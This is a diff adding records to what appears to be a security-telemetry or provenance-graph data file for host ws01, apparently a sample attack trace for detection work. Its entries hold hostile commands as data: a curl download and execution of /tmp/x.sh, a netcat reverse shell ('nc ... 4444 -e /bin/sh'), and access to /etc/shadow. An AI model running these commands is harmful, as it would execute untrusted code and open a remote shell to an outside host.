@@ -1,0 +1,14 @@
+8c1e2f3a-ws01|tcp|203.0.113.66:8080,{'netflow': '10.20.0.11:33894->203.0.113.66:8080'},6
+8c1e2f3a-ws01|tcp|198.51.100.23:4444,{'netflow': '10.20.0.11:59189->198.51.100.23:4444'},7
+EID-ws01-000740,{'subject': '/usr/bin/bash bash -i'},721
+EID-ws01-000741,{'subject': '/usr/bin/curl curl -s http://203.0.113.66:8080/x.sh -o /tmp/x.sh'},722
+EID-ws01-000742,{'subject': '/usr/bin/chmod chmod +x /tmp/x.sh'},723
+EID-ws01-000743,{'subject': '/tmp/x.sh /tmp/x.sh'},724
+EID-ws01-000744,{'subject': '/usr/bin/nc nc 198.51.100.23 4444 -e /bin/sh'},725
+8c1e2f3a-ws01|/usr/bin/bash,{'file': '/usr/bin/bash'},817
+8c1e2f3a-ws01|/usr/bin/curl,{'file': '/usr/bin/curl'},846
+8c1e2f3a-ws01|/tmp/x.sh,{'file': '/tmp/x.sh'},847
+8c1e2f3a-ws01|/usr/bin/chmod,{'file': '/usr/bin/chmod'},848
+8c1e2f3a-ws01|/etc/shadow,{'file': '/etc/shadow'},849
+8c1e2f3a-ws01|/tmp/.cache/payload,{'file': '/tmp/.cache/payload'},850
+8c1e2f3a-ws01|/usr/bin/nc,{'file': '/usr/bin/nc'},851
